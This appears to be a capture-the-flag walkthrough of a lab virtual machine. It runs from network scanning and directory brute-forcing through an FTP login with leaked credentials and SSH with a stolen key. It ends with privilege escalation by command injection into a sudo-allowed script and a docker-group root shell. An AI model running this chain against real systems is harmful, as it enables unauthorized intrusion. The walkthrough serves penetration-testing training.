@@ -1,1 +1,375 @@
+					ENUMERATION
 
+---ifconfig----
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 3903650  bytes 1967108546 (1.8 GiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3863152  bytes 608293813 (580.1 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 538  bytes 55252 (53.9 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 538  bytes 55252 (53.9 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+----netdiscover----
+
+Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                                          
+                                                                                                                          
+ 24 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1440                                                        
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      6     360  Unknown vendor                                                         
+ 10.0.2.2        52:54:00:12:35:00      6     360  Unknown vendor                                                         
+ 10.0.2.3        08:00:27:66:45:ed      6     360  PCS Systemtechnik GmbH                                                 
+ 10.0.2.26       08:00:27:44:5b:37      6     360  PCS Systemtechnik GmbH                                                 
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+
+
+----nmap----
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.26 -sS -sC -sV -A -T4      
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-22 21:18 +03
+Nmap scan report for 10.0.2.26
+Host is up (0.00063s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
+|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
+|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Pwned....!!
+MAC Address: 08:00:27:44:5B:37 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.63 ms 10.0.2.26
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds
+                                                                               
+
+----we see there are open ftp, ssh and http ports, lets abuse the http ports first because we dont know any user credentials yet-----
+
+
+
+----dirb----
+
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.26
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Mar 22 21:19:23 2024
+URL_BASE: http://10.0.2.26/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.26/ ----
++ http://10.0.2.26/index.html (CODE:200|SIZE:3065)                                                                        
++ http://10.0.2.26/robots.txt (CODE:200|SIZE:41)                                                                          
++ http://10.0.2.26/server-status (CODE:403|SIZE:274)                                                                      
+                                                                                                                          
+-----------------
+END_TIME: Fri Mar 22 21:19:28 2024
+DOWNLOADED: 4612 - FOUND: 3
+
+
+
+----not much, lets run gobuster----
+
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.26 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,css,png,txt,jpg,jpeg
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.26
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,html,css,png,txt,jpg,jpeg
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 274]
+/index.html           (Status: 200) [Size: 3065]
+/robots.txt           (Status: 200) [Size: 41]
+/nothing              (Status: 301) [Size: 308] [--> http://10.0.2.26/nothing/]
+/.html                (Status: 403) [Size: 274]
+/server-status        (Status: 403) [Size: 274]
+/hidden_text          (Status: 301) [Size: 312] [--> http://10.0.2.26/hidden_text/]
+Progress: 1764480 / 1764488 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                              
+
+----nothing page is empty, but hiden_text page has a folder named secret.dic which has other webpages----
+
+----in 10.0.2.26/pwned.vuln we see a login form----
+
+----when we inspect the page we see user credentials for ftp service----
+
+username = ftpuser
+
+password = B0ss_B!TcH
+
+
+
+----open with ftp----
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# ftp 10.0.2.26
+Connected to 10.0.2.26.
+220 (vsFTPd 3.0.3)
+Name (10.0.2.26:okina): ftpuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||20795|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
+226 Directory send OK.
+ftp> cd share
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||63283|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
+-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
+226 Directory send OK.
+ftp> more note.txt
+
+Wow you are here 
+
+ariana won't happy about this note 
+
+sorry ariana :( 
+
+ftp> more id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+
+--More--
+
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||39758|)
+150 Opening BINARY mode data connection for id_rsa (2602 bytes).
+100% |******************************************************************************|  2602        4.93 MiB/s    00:00 ETA
+226 Transfer complete.
+2602 bytes received in 00:00 (1.67 MiB/s)
+ftp> get note.txt
+local: note.txt remote: note.txt
+229 Entering Extended Passive Mode (|||32124|)
+150 Opening BINARY mode data connection for note.txt (75 bytes).
+100% |******************************************************************************|    75        1.88 MiB/s    00:00 ETA
+226 Transfer complete.
+75 bytes received in 00:00 (52.54 KiB/s)
+
+
+----download these 2 files with get command, we learn about the username ariana and 
+the ssh key of this user. Thanks to this ssh key we can login without knowing the password,
+lets set the privileges first----
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# chown 777 id_rsa            
+
+                                                                                                                  
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# chmod 777 note.txt 
+
+
+
+				GAINING FOOTHOLD
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# ssh ariana@10.0.2.26 -i id_rsa
+Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70
+ariana@pwned:~$ ls
+ariana-personal.diary  user1.txt
+ariana@pwned:~$ cat user1.txt
+congratulations you Pwned ariana 
+
+Here is your user flag ↓↓↓↓↓↓↓
+
+----First User Flag----
+
+Try harder.need become root
+
+ariana@pwned:~$ 
+
+
+
+				
+				PRIVILEGE ESCALATION (HORIZONTAL)
+
+---sudo -l----
+
+ariana@pwned:~$ sudo -l
+Matching Defaults entries for ariana on pwned:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ariana may run the following commands on pwned:
+    (selena) NOPASSWD: /home/messenger.sh
+ariana@pwned:~$ 
+
+
+----with sudo -l we see that user selena can run /home/messenger.sh script without a password----
+
+---script'in içeriğine bakalım----
+
+
+
+ariana@pwned:~$ cat /home/messenger.sh
+#!/bin/bash
+
+clear
+echo "Welcome to linux.messenger "
+		echo ""
+users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
+		echo ""
+echo "$users"
+		echo ""
+read -p "Enter username to send message : " name 
+		echo ""
+read -p "Enter message for $name :" msg
+		echo ""
+echo "Sending message to $name "
+
+$msg 2> /dev/null
+
+		echo ""
+echo "Message sent to $name :) "
+		echo ""
+
+
+---lets run this script as user selena----
+
+
+
+ariana@pwned:~$ cd /home
+ariana@pwned:/home$ sudo -u selena ./messenger.sh
+
+
+
+----lets open a shell as selena with the following commands----
+
+
+Welcome to linux.messenger 
+
+
+ariana:
+selena:
+ftpuser:
+
+Enter username to send message : ariana
+
+Enter message for ariana :bash
+
+Sending message to ariana 
+whoami
+selena
+pwd
+/home
+cd selena
+pwd
+/home/selena
+ls
+selena-personal.diary  user2.txt
+cat user2.txt	    
+----Second User Flag----
+
+You are near to me. you found selena too.
+
+Try harder to catch me
+
+
+
+
+
+----now we are selena----
+
+id
+uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
+
+
+----when we use id command we see that selena is a part of the dockers group, lets search about the group and their privilege escalation methods----
+
+
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+privesc             latest              09ae39f0f8fc        3 years ago         88.3MB
+<none>              <none>              e13ad046d435        3 years ago         88.3MB
+alpine              latest              a24bb4013296        3 years ago         5.57MB
+debian              wheezy              10fcec6d95c4        5 years ago         88.3MB
+
+
+
+----I go to gtfobins and search for docker, shell and find a command that I can use----
+
+NOT: you can use privesc command instead of alpine, it also works 
+
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# whoami
+root
+# ls
+bin   core  etc   initrd.img	  lib	 lib64	 lost+found  mnt  proc	run   srv  tmp	var	 vmlinuz.old
+boot  dev   home  initrd.img.old  lib32  libx32  media	     opt  root	sbin  sys  usr	vmlinuz
+# cd root
+# ls
+root.txt
+# cat root.txt	
+----Root User Flag----
+                     
